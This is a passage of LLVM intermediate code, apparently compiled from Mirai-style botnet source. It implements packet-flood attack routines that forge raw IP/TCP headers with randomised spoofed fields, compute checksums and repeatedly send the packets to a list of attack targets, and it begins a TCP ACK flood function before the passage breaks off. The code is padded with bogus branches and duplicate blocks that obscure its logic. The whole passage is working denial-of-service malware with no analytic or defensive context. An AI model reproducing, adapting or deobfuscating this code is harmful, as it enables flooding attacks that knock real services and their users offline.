  store i32 0, i32* %9, align 4
  br label %322

; <label>:322:                                    ; preds = %originalBBpart269, %321
  %323 = load i32, i32* %9, align 4
  %324 = load i8, i8* %5, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp slt i32 %323, %325
  br i1 %326, label %327, label %612

; <label>:327:                                    ; preds = %322
  %328 = load i8**, i8*** %11, align 8
  %329 = load i32, i32* %9, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds i8*, i8** %328, i64 %330
  %332 = load i8*, i8** %331, align 8
  store i8* %332, i8** %30, align 8
  %333 = load i8*, i8** %30, align 8
  %334 = bitcast i8* %333 to %struct.iphdr*
  store %struct.iphdr* %334, %struct.iphdr** %31, align 8
  %335 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i64 1
  %337 = bitcast %struct.iphdr* %336 to %struct.tcphdr*
  store %struct.tcphdr* %337, %struct.tcphdr** %32, align 8
  %338 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %341, i32 0, i32 2
  %343 = load i8, i8* %342, align 4
  %344 = zext i8 %343 to i32
  %345 = icmp slt i32 %344, 32
  br i1 %345, label %346, label %367

; <label>:346:                                    ; preds = %327
  %347 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i32 0, i32 1
  %352 = load i32, i32* %351, align 4
  %353 = call i32 @ntohl(i32 %352) #7
  %354 = call i32 @rand_next()
  %355 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %356 = load i32, i32* %9, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %355, i64 %357
  %359 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %358, i32 0, i32 2
  %360 = load i8, i8* %359, align 4
  %361 = zext i8 %360 to i32
  %362 = lshr i32 %354, %361
  %363 = add i32 %353, %362
  %364 = call i32 @htonl(i32 %363) #7
  %365 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i32 0, i32 9
  store i32 %364, i32* %366, align 4
  br label %367

; <label>:367:                                    ; preds = %346, %327
  %368 = load i32, i32* %26, align 4
  %369 = icmp eq i32 %368, -1
  br i1 %369, label %370, label %390

; <label>:370:                                    ; preds = %367
  %371 = load i32, i32* @x.25
  %372 = load i32, i32* @y.26
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %370
  %379 = call i32 @rand_next()
  %380 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 8
  store i32 %379, i32* %381, align 4
  %382 = load i32, i32* @x.25
  %383 = load i32, i32* @y.26
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br label %390

; <label>:390:                                    ; preds = %originalBBpart210, %367
  %391 = load i16, i16* %13, align 2
  %392 = zext i16 %391 to i32
  %393 = icmp eq i32 %392, 65535
  br i1 %393, label %394, label %416

; <label>:394:                                    ; preds = %390
  %395 = load i32, i32* @x.25
  %396 = load i32, i32* @y.26
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %394
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 3
  store i16 %405, i16* %407, align 4
  %408 = load i32, i32* @x.25
  %409 = load i32, i32* @y.26
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart227, label %originalBB12alteredBB

originalBBpart227:                                ; preds = %originalBB12
  br label %416

; <label>:416:                                    ; preds = %originalBBpart227, %390
  %417 = load i32, i32* @x.25
  %418 = load i32, i32* @y.26
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %416
  %425 = load i16, i16* %16, align 2
  %426 = zext i16 %425 to i32
  %427 = icmp eq i32 %426, 65535
  %428 = load i32, i32* @x.25
  %429 = load i32, i32* @y.26
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %427, label %436, label %442

; <label>:436:                                    ; preds = %originalBBpart231
  %437 = call i32 @rand_next()
  %438 = and i32 %437, 65535
  %439 = trunc i32 %438 to i16
  %440 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %441 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %440, i32 0, i32 0
  store i16 %439, i16* %441, align 4
  br label %442

; <label>:442:                                    ; preds = %436, %originalBBpart231
  %443 = load i32, i32* @x.25
  %444 = load i32, i32* @y.26
  %445 = sub i32 %443, 1
  %446 = mul i32 %443, %445
  %447 = urem i32 %446, 2
  %448 = icmp eq i32 %447, 0
  %449 = icmp slt i32 %444, 10
  %450 = or i1 %448, %449
  br i1 %450, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %442
  %451 = load i16, i16* %17, align 2
  %452 = zext i16 %451 to i32
  %453 = icmp eq i32 %452, 65535
  %454 = load i32, i32* @x.25
  %455 = load i32, i32* @y.26
  %456 = sub i32 %454, 1
  %457 = mul i32 %454, %456
  %458 = urem i32 %457, 2
  %459 = icmp eq i32 %458, 0
  %460 = icmp slt i32 %455, 10
  %461 = or i1 %459, %460
  br i1 %461, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %453, label %462, label %468

; <label>:462:                                    ; preds = %originalBBpart235
  %463 = call i32 @rand_next()
  %464 = and i32 %463, 65535
  %465 = trunc i32 %464 to i16
  %466 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 1
  store i16 %465, i16* %467, align 2
  br label %468

; <label>:468:                                    ; preds = %462, %originalBBpart235
  %469 = load i32, i32* %18, align 4
  %470 = icmp eq i32 %469, 65535
  br i1 %470, label %471, label %475

; <label>:471:                                    ; preds = %468
  %472 = call i32 @rand_next()
  %473 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %474 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %473, i32 0, i32 2
  store i32 %472, i32* %474, align 4
  br label %475

; <label>:475:                                    ; preds = %471, %468
  %476 = load i32, i32* @x.25
  %477 = load i32, i32* @y.26
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %475
  %484 = load i32, i32* %19, align 4
  %485 = icmp eq i32 %484, 65535
  %486 = load i32, i32* @x.25
  %487 = load i32, i32* @y.26
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %485, label %494, label %514

; <label>:494:                                    ; preds = %originalBBpart239
  %495 = load i32, i32* @x.25
  %496 = load i32, i32* @y.26
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %494
  %503 = call i32 @rand_next()
  %504 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %505 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %504, i32 0, i32 3
  store i32 %503, i32* %505, align 4
  %506 = load i32, i32* @x.25
  %507 = load i32, i32* @y.26
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %514

; <label>:514:                                    ; preds = %originalBBpart243, %originalBBpart239
  %515 = load i8, i8* %20, align 1
  %516 = icmp ne i8 %515, 0
  br i1 %516, label %517, label %539

; <label>:517:                                    ; preds = %514
  %518 = load i32, i32* @x.25
  %519 = load i32, i32* @y.26
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %517
  %526 = call i32 @rand_next()
  %527 = and i32 %526, 65535
  %528 = trunc i32 %527 to i16
  %529 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 7
  store i16 %528, i16* %530, align 2
  %531 = load i32, i32* @x.25
  %532 = load i32, i32* @y.26
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBBpart259, label %originalBB45alteredBB

originalBBpart259:                                ; preds = %originalBB45
  br label %539

; <label>:539:                                    ; preds = %originalBBpart259, %514
  %540 = load i32, i32* @x.25
  %541 = load i32, i32* @y.26
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %539
  %548 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 7
  store i16 0, i16* %549, align 2
  %550 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %551 = bitcast %struct.iphdr* %550 to i16*
  %552 = call zeroext i16 @checksum_generic(i16* %551, i32 20)
  %553 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %554 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %553, i32 0, i32 7
  store i16 %552, i16* %554, align 2
  %555 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %556 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %555, i32 0, i32 6
  store i16 0, i16* %556, align 4
  %557 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %558 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %559 = bitcast %struct.tcphdr* %558 to i8*
  %560 = call zeroext i16 @htons(i16 zeroext 40) #7
  %561 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %557, i8* %559, i16 zeroext %560, i32 40)
  %562 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 6
  store i16 %561, i16* %563, align 4
  %564 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i32 0, i32 1
  %566 = load i16, i16* %565, align 2
  %567 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %568 = load i32, i32* %9, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %567, i64 %569
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %570, i32 0, i32 0
  %572 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %571, i32 0, i32 1
  store i16 %566, i16* %572, align 2
  %573 = load i32, i32* %10, align 4
  %574 = load i8*, i8** %30, align 8
  %575 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %576 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %577 = load i32, i32* %9, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %576, i64 %578
  %580 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %579, i32 0, i32 0
  %581 = bitcast %struct.sockaddr_in* %580 to %struct.sockaddr*
  store %struct.sockaddr* %581, %struct.sockaddr** %575, align 8
  %582 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %583 = load %struct.sockaddr*, %struct.sockaddr** %582, align 8
  %584 = call i64 @sendto(i32 %573, i8* %574, i64 60, i32 16384, %struct.sockaddr* %583, i32 16)
  %585 = load i32, i32* @x.25
  %586 = load i32, i32* @y.26
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %593

; <label>:593:                                    ; preds = %originalBBpart263
  %594 = load i32, i32* @x.25
  %595 = load i32, i32* @y.26
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %593
  %602 = load i32, i32* %9, align 4
  %603 = add nsw i32 %602, 1
  store i32 %603, i32* %9, align 4
  %604 = load i32, i32* @x.25
  %605 = load i32, i32* @y.26
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBBpart269, label %originalBB65alteredBB

originalBBpart269:                                ; preds = %originalBB65
  br label %322

; <label>:612:                                    ; preds = %322
  br label %321

; <label>:613:                                    ; preds = %120, %98
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %99
  store i32 1, i32* %9, align 4
  %614 = load i32, i32* %10, align 4
  %615 = bitcast i32* %9 to i8*
  %616 = call i32 @setsockopt(i32 %614, i32 0, i32 3, i8* %615, i32 4) #6
  %617 = icmp eq i32 %616, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %301
  %618 = load i32, i32* %9, align 4
  %_ = shl i32 %618, 1
  %_2 = sub i32 %618, 1
  %gen = mul i32 %_2, 1
  %_3 = sub i32 %618, 1
  %gen4 = mul i32 %_3, 1
  %619 = add nsw i32 %618, 1
  store i32 %619, i32* %9, align 4
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %370
  %620 = call i32 @rand_next()
  %621 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %622 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %621, i32 0, i32 8
  store i32 %620, i32* %622, align 4
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %394
  %623 = call i32 @rand_next()
  %_13 = sub i32 %623, 65535
  %gen14 = mul i32 %_13, 65535
  %_15 = sub i32 %623, 65535
  %gen16 = mul i32 %_15, 65535
  %_17 = sub i32 0, %623
  %gen18 = add i32 %_17, 65535
  %_19 = sub i32 0, %623
  %gen20 = add i32 %_19, 65535
  %_21 = sub i32 %623, 65535
  %gen22 = mul i32 %_21, 65535
  %_23 = shl i32 %623, 65535
  %_24 = sub i32 %623, 65535
  %gen25 = mul i32 %_24, 65535
  %624 = and i32 %623, 65535
  %625 = trunc i32 %624 to i16
  %626 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %627 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %626, i32 0, i32 3
  store i16 %625, i16* %627, align 4
  br label %originalBB12

originalBB29alteredBB:                            ; preds = %originalBB29, %416
  %628 = load i16, i16* %16, align 2
  %629 = zext i16 %628 to i32
  %630 = icmp eq i32 %629, 65535
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %442
  %631 = load i16, i16* %17, align 2
  %632 = zext i16 %631 to i32
  %633 = icmp eq i32 %632, 65535
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %475
  %634 = load i32, i32* %19, align 4
  %635 = icmp eq i32 %634, 65535
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %494
  %636 = call i32 @rand_next()
  %637 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %638 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %637, i32 0, i32 3
  store i32 %636, i32* %638, align 4
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %517
  %639 = call i32 @rand_next()
  %_46 = shl i32 %639, 65535
  %_47 = sub i32 0, %639
  %gen48 = add i32 %_47, 65535
  %_49 = shl i32 %639, 65535
  %_50 = sub i32 %639, 65535
  %gen51 = mul i32 %_50, 65535
  %_52 = sub i32 %639, 65535
  %gen53 = mul i32 %_52, 65535
  %_54 = sub i32 0, %639
  %gen55 = add i32 %_54, 65535
  %_56 = sub i32 0, %639
  %gen57 = add i32 %_56, 65535
  %640 = and i32 %639, 65535
  %641 = trunc i32 %640 to i16
  %642 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %643 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %642, i32 0, i32 7
  store i16 %641, i16* %643, align 2
  br label %originalBB45

originalBB61alteredBB:                            ; preds = %originalBB61, %539
  %644 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %645 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %644, i32 0, i32 7
  store i16 0, i16* %645, align 2
  %646 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %647 = bitcast %struct.iphdr* %646 to i16*
  %648 = call zeroext i16 @checksum_generic(i16* %647, i32 20)
  %649 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %650 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %649, i32 0, i32 7
  store i16 %648, i16* %650, align 2
  %651 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %652 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %651, i32 0, i32 6
  store i16 0, i16* %652, align 4
  %653 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %654 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %655 = bitcast %struct.tcphdr* %654 to i8*
  %656 = call zeroext i16 @htons(i16 zeroext 40) #7
  %657 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %653, i8* %655, i16 zeroext %656, i32 40)
  %658 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %659 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %658, i32 0, i32 6
  store i16 %657, i16* %659, align 4
  %660 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %661 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %660, i32 0, i32 1
  %662 = load i16, i16* %661, align 2
  %663 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %664 = load i32, i32* %9, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %663, i64 %665
  %667 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %666, i32 0, i32 0
  %668 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %667, i32 0, i32 1
  store i16 %662, i16* %668, align 2
  %669 = load i32, i32* %10, align 4
  %670 = load i8*, i8** %30, align 8
  %671 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %672 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %673 = load i32, i32* %9, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %672, i64 %674
  %676 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %675, i32 0, i32 0
  %677 = bitcast %struct.sockaddr_in* %676 to %struct.sockaddr*
  store %struct.sockaddr* %677, %struct.sockaddr** %671, align 8
  %678 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %679 = load %struct.sockaddr*, %struct.sockaddr** %678, align 8
  %680 = call i64 @sendto(i32 %669, i8* %670, i64 60, i32 16384, %struct.sockaddr* %679, i32 16)
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %593
  %681 = load i32, i32* %9, align 4
  %_66 = shl i32 %681, 1
  %_67 = shl i32 %681, 1
  %682 = add nsw i32 %681, 1
  store i32 %682, i32* %9, align 4
  br label %originalBB65
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %632

; <label>:109:                                    ; preds = %4
  %110 = load i32, i32* @x.27
  %111 = load i32, i32* @y.28
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %109
  store i32 1, i32* %9, align 4
